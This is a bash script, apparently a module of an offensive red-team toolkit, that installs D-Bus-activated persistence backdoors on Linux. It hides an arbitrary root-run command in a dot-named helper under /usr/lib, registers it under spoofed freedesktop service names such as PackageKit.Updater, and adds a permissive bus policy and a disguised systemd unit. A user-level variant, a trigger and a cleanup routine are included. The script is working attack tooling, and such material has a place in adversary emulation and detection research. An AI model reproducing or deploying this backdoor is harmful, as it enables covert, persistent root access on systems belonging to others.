#!/bin/bash
# T1543.002 — Create or Modify System Process: D-Bus Service Persistence
# Register D-Bus activated system services for on-demand backdoor execution

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_dbus"

banner_dbus() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1543.002 — D-Bus Service Persistence       ║"
    echo "  ║   On-demand IPC-triggered backdoor activation  ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

dbus_system_service() {
    echo -e "${CYAN}[*] Creating D-Bus activated system service${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    if ! command -v dbus-send &>/dev/null; then
        echo -e "${RED}[!] dbus-send not found. D-Bus is not installed.${NC}"
        return
    fi

    # Legitimate-looking service names
    echo "  Service name presets:"
    echo -e "  ${CYAN}[1]${NC} org.freedesktop.PackageKit.Updater"
    echo -e "  ${CYAN}[2]${NC} org.freedesktop.NetworkManager.Diagnostics"
    echo -e "  ${CYAN}[3]${NC} org.freedesktop.systemd1.Maintenance"
    echo -e "  ${CYAN}[4]${NC} org.freedesktop.PolicyKit1.Helper"
    echo -e "  ${CYAN}[5]${NC} Custom"
    read -p "  Choose [1]: " nc
    nc="${nc:-1}"

    local SVCNAME
    case "$nc" in
        1) SVCNAME="org.freedesktop.PackageKit.Updater" ;;
        2) SVCNAME="org.freedesktop.NetworkManager.Diagnostics" ;;
        3) SVCNAME="org.freedesktop.systemd1.Maintenance" ;;
        4) SVCNAME="org.freedesktop.PolicyKit1.Helper" ;;
        5) read -p "  Service name (e.g. org.example.Service): " SVCNAME ;;
        *) SVCNAME="org.freedesktop.PackageKit.Updater" ;;
    esac

    local SVCPATH="/$(echo "$SVCNAME" | tr '.' '/')"
    local IFACE="$SVCNAME"

    read -p "  Command to execute on activation: " CMD
    [[ -z "$CMD" ]] && { echo -e "${RED}[!] Command required${NC}"; return; }

    # Create the helper script
    local HELPER="/usr/lib/.d3m0n_dbus_helper.sh"
    cat > "$HELPER" << HEOF
#!/bin/bash
# ${MARKER}
${CMD}
HEOF
    chmod 755 "$HELPER"

    # Create D-Bus service file
    local DBUS_SVC_DIR="/usr/share/dbus-1/system-services"
    mkdir -p "$DBUS_SVC_DIR" 2>/dev/null

    cat > "${DBUS_SVC_DIR}/${SVCNAME}.service" << DEOF
# ${MARKER}
[D-BUS Service]
Name=${SVCNAME}
Exec=/bin/bash ${HELPER}
User=root
SystemdService=d3m0n-dbus-helper.service
DEOF

    # Create D-Bus policy (allow activation)
    cat > "/etc/dbus-1/system.d/${SVCNAME}.conf" << PEOF
<?xml version="1.0" encoding="UTF-8"?>
<!-- ${MARKER} -->
<busconfig>
  <policy context="default">
    <allow own="${SVCNAME}"/>
    <allow send_destination="${SVCNAME}"/>
    <allow send_interface="${IFACE}"/>
  </policy>
</busconfig>
PEOF

    # Create systemd service that D-Bus will activate
    cat > "/etc/systemd/system/d3m0n-dbus-helper.service" << SEOF
[Unit]
Description=System Package Kit Helper
After=dbus.service

[Service]
Type=simple
BusName=${SVCNAME}
ExecStart=/bin/bash ${HELPER}
Restart=on-failure
RestartSec=30

[Install]
WantedBy=multi-user.target
SEOF

    systemctl daemon-reload 2>/dev/null

    echo -e "${GREEN}[+] D-Bus service registered: ${SVCNAME}${NC}"
    echo -e "${GREEN}[+] Helper: ${HELPER}${NC}"
    echo -e "${YELLOW}[*] Trigger: dbus-send --system --type=method_call --dest=${SVCNAME} ${SVCPATH} ${IFACE}.Execute${NC}"
    echo -e "${YELLOW}[*] Also auto-starts on D-Bus bus activation${NC}"
}

dbus_session_service() {
    echo -e "${CYAN}[*] Creating D-Bus session (user-level) service${NC}"

    if ! command -v dbus-send &>/dev/null; then
        echo -e "${RED}[!] dbus-send not found${NC}"
        return
    fi

    read -p "  Service name [org.freedesktop.Notifications.Helper]: " SVCNAME
    SVCNAME="${SVCNAME:-org.freedesktop.Notifications.Helper}"

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && return

    local HELPER="$HOME/.local/lib/.d3m0n_dbus_session.sh"
    mkdir -p "$(dirname "$HELPER")" 2>/dev/null
    cat > "$HELPER" << HEOF
#!/bin/bash
# ${MARKER}
${CMD}
HEOF
    chmod 700 "$HELPER"

    # Session D-Bus service
    local SVC_DIR="$HOME/.local/share/dbus-1/services"
    mkdir -p "$SVC_DIR" 2>/dev/null

    cat > "${SVC_DIR}/${SVCNAME}.service" << DEOF
# ${MARKER}
[D-BUS Service]
Name=${SVCNAME}
Exec=/bin/bash ${HELPER}
DEOF

    echo -e "${GREEN}[+] Session D-Bus service: ${SVCNAME}${NC}"
    echo -e "${YELLOW}[*] Trigger: dbus-send --session --type=method_call --dest=${SVCNAME} /${SVCNAME//./\/} ${SVCNAME}.Run${NC}"
}

dbus_trigger() {
    echo -e "${CYAN}[*] Trigger D-Bus service activation${NC}"

    echo -e "  ${CYAN}[1]${NC} System bus"
    echo -e "  ${CYAN}[2]${NC} Session bus"
    read -p "  Bus [1]: " bt
    bt="${bt:-1}"

    read -p "  Service name: " SVCNAME
    [[ -z "$SVCNAME" ]] && return

    local SVCPATH="/$(echo "$SVCNAME" | tr '.' '/')"

    if [[ "$bt" == "1" ]]; then
        dbus-send --system --type=method_call --dest="$SVCNAME" "$SVCPATH" "${SVCNAME}.Execute" 2>/dev/null
    else
        dbus-send --session --type=method_call --dest="$SVCNAME" "$SVCPATH" "${SVCNAME}.Run" 2>/dev/null
    fi

    echo -e "${GREEN}[+] Activation signal sent to ${SVCNAME}${NC}"
}

dbus_cleanup() {
    echo -e "${CYAN}[*] Cleaning up D-Bus persistence...${NC}"

    # System level
    if [[ $EUID -eq 0 ]]; then
        # Remove service files
        find /usr/share/dbus-1/system-services/ -type f 2>/dev/null | while IFS= read -r f; do
            grep -q "$MARKER" "$f" 2>/dev/null && rm -f "$f" && echo -e "  ${GREEN}[+] Removed: $f${NC}"
        done

        # Remove policy files
        find /etc/dbus-1/system.d/ -type f 2>/dev/null | while IFS= read -r f; do
            grep -q "$MARKER" "$f" 2>/dev/null && rm -f "$f" && echo -e "  ${GREEN}[+] Removed: $f${NC}"
        done

        # Remove systemd service
        systemctl stop d3m0n-dbus-helper 2>/dev/null
        systemctl disable d3m0n-dbus-helper 2>/dev/null
        rm -f /etc/systemd/system/d3m0n-dbus-helper.service
        systemctl daemon-reload 2>/dev/null

        # Remove helper
        rm -f /usr/lib/.d3m0n_dbus_helper.sh
    fi

    # Session level
    find "$HOME/.local/share/dbus-1/services/" -type f 2>/dev/null | while IFS= read -r f; do
        grep -q "$MARKER" "$f" 2>/dev/null && rm -f "$f" && echo -e "  ${GREEN}[+] Removed: $f${NC}"
    done
    rm -f "$HOME/.local/lib/.d3m0n_dbus_session.sh" 2>/dev/null

    # Reload D-Bus
    systemctl reload dbus 2>/dev/null || dbus-send --system --type=method_call \
        --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ReloadConfig 2>/dev/null

    echo -e "${GREEN}[+] D-Bus cleanup complete${NC}"
}

main() {
    banner_dbus

    echo -e "  ${CYAN}[1]${NC} Create system D-Bus service (root, on-demand)"
    echo -e "  ${CYAN}[2]${NC} Create session D-Bus service (user, on-demand)"
    echo -e "  ${CYAN}[3]${NC} Trigger D-Bus activation"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "Choose [1-4]: " OPT

    case "$OPT" in
        1) dbus_system_service ;;
        2) dbus_session_service ;;
        3) dbus_trigger ;;
        4) dbus_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
